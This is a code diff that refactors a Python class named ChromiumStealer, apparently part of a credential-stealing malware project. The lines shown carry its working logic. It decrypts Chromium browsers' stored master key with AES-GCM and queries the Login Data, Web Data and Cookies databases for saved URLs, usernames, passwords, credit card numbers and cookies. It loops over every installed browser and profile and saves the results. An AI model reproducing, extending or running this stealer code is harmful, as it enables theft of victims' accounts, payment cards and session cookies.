@@ -66,7 +66,7 @@ class ChromiumStealer(ModuleManager):
             'iridium': appdata + '\\Iridium\\User Data',
         }
 
-    def get_master_key(self, path: str) -> bytes:
+    def __get_master_key(self, path: str) -> bytes:
         if not os.path.exists(path):
             return
 
@@ -83,7 +83,7 @@ class ChromiumStealer(ModuleManager):
         return master_key
 
 
-    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
+    def __decrypt_password(self, buff: bytes, master_key: bytes) -> str:
         iv = buff[3:15]
         payload = buff[15:]
         cipher = AES.new(master_key, AES.MODE_GCM, iv)
@@ -111,7 +111,7 @@ class ChromiumStealer(ModuleManager):
             os.rmdir(save_path)
 
 
-    def get_login_data(self, path: str, profile: str, master_key: bytes, browser_name: str) -> str:
+    def __get_login_data(self, path: str, profile: str, master_key: bytes, browser_name: str) -> str:
         result = ""
         login_db = f'{path}\\{profile}\\Login Data'
         copy_path = os.path.join(self.browsers_folder, browser_name, profile) 
@@ -132,7 +132,7 @@ class ChromiumStealer(ModuleManager):
         cursor.execute('SELECT action_url, username_value, password_value FROM logins')
 
         for row in cursor.fetchall():
-            password = self.decrypt_password(row[2], master_key)
+            password = self.__decrypt_password(row[2], master_key)
             result += f"""\nURL: {row[0]}\nEmail: {row[1]}\nPassword: {password}"""
             result += Constant.seperator
             
@@ -140,7 +140,7 @@ class ChromiumStealer(ModuleManager):
         return result
 
 
-    def get_credit_cards(self, path: str, profile: str, master_key: bytes, browser_name:str) -> str:
+    def __get_credit_cards(self, path: str, profile: str, master_key: bytes, browser_name:str) -> str:
         result = ""
         cards_db = f'{path}\\{profile}\\Web Data'
         copy_path = os.path.join(self.browsers_folder, browser_name, profile) 
@@ -164,7 +164,7 @@ class ChromiumStealer(ModuleManager):
             if not row[0] or not row[1] or not row[2] or not row[3]:
                 continue
             
-            card_number = self.decrypt_password(row[3], master_key)
+            card_number = self.__decrypt_password(row[3], master_key)
             result += f"""\nName On Card: {row[0]}\nCard Number: {card_number}\nExpires On:  {row[1]} / {row[2]}\nAdded On: {datetime.fromtimestamp(row[4])}"""
             result += Constant.seperator
             
@@ -172,7 +172,7 @@ class ChromiumStealer(ModuleManager):
         return result
 
 
-    def get_cookies(self, path: str, profile: str, master_key: bytes, browser_name:str) -> str:
+    def __get_cookies(self, path: str, profile: str, master_key: bytes, browser_name:str) -> str:
         result = ""
         cookie_db = f'{path}\\{profile}\\Network\\Cookies'
         copy_path = os.path.join(self.browsers_folder, browser_name, profile) 
@@ -196,14 +196,15 @@ class ChromiumStealer(ModuleManager):
             if not row[0] or not row[1] or not row[2] or not row[3]:
                 continue
 
-            cookie = self.decrypt_password(row[3], master_key)
+            cookie = self.__decrypt_password(row[3], master_key)
             result += f"""\nHost Key : {row[0]}\nCookie Name : {row[1]}\nPath: {row[2]}\nCookie: {cookie}\nExpires On: {row[4]}"""
             result += Constant.seperator
 
         conn.close()
         return result
 
-    def get_web_history(self, path: str, profile: str, browser_name: str) -> str:
+
+    def __get_web_history(self, path: str, profile: str, browser_name: str) -> str:
         result = ""
         web_history_db = f'{path}\\{profile}\\History'
         copy_path = os.path.join(self.browsers_folder, browser_name, profile) 
@@ -241,28 +242,29 @@ class ChromiumStealer(ModuleManager):
         return result
 
 
-    def installed_browsers(self):
+    def installed_chromium_browsers(self):
         results = []
         for browser, path in self.browsers.items():
             if os.path.exists(path):
                 results.append(browser)
         return results
     
+    
     def run(self):
         profiles = ["Default"]
         for i in range(1, 11):
             profiles.append("Profile {number}".format(number=i))
         
-        available_browsers = self.installed_browsers()
+        available_browsers = self.installed_chromium_browsers()
 
         for browser in available_browsers:
             browser_path = self.browsers[browser]
-            master_key = self.get_master_key(browser_path)
+            master_key = self.__get_master_key(browser_path)
 
             for profile in profiles:
                 self.save_results(
                     browser, 'login', 
-                    self.get_login_data(
+                    self.__get_login_data(
                         path=browser_path, 
                         profile=profile, 
                         master_key=master_key, 
@@ -272,7 +274,7 @@ class ChromiumStealer(ModuleManager):
                 
                 self.save_results(
                     browser, 'cookies', 
-                    self.get_cookies(
+                    self.__get_cookies(
                         path=browser_path, 
                         profile=profile, 
                         master_key=master_key, 
@@ -282,7 +284,7 @@ class ChromiumStealer(ModuleManager):
                 
                 self.save_results(
                     browser, 'cards', 
-                    self.get_credit_cards(
+                    self.__get_credit_cards(
                         path=browser_path, 
                         profile=profile, 
                         master_key=master_key, 
@@ -290,7 +292,7 @@ class ChromiumStealer(ModuleManager):
                     ), profile
                 )
                 
-                self.get_web_history(
+                self.__get_web_history(
                     path=browser_path, 
                     browser_name=browser, 
                     profile=profile
@@ -311,4 +313,4 @@ class ChromiumStealer(ModuleManager):
                 #     ), profile
                 # )
                 # -----------
-                
+
